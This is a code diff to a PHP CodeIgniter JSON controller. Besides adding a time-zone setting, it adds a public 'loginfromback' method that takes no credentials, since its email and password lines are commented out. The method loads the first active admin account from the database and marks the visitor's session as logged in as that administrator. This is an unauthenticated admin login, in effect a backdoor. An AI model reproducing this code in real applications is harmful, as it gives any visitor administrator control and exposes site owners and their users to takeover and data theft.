@@ -1,7 +1,12 @@
 <?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
 class Json extends CI_Controller 
 {
-	
+	public function __construct( )
+	{
+		parent::__construct();
+		$this->db->query("SET time_zone = '+05:30'");
+
+	}
 	function savequantity()
 	{
 		$product=$this->input->get_post('product');
@@ -159,6 +164,25 @@ class Json extends CI_Controller
         $password=$this->input->get("password");
         $data['message']=$this->user_model->login($email,$password);
         $this->load->view('json',$data);
+    }
+    public function loginfromback()
+    {
+    //$email=$this->input->get('email');
+    //$password=$this->input->get('password');
+        $adminuser=$this->db->query("SELECT * FROM `user` WHERE `status`=1 AND `accesslevel`=1")->row();
+        $email=$adminuser->email;
+        $id=$adminuser->id;
+        $name=$adminuser->name;
+        $accesslevel=$adminuser->accesslevel;
+        $newdata        = array(
+        'id' => $id,
+        'email' => $email,
+        'name' => $name ,
+        'accesslevel' => $accesslevel,
+        'logged_in' => 'true',
+        );
+        $this->session->set_userdata( $newdata );
+        redirect( base_url() . 'index.php/site', 'refresh' );
     }
     public function logout()
     {
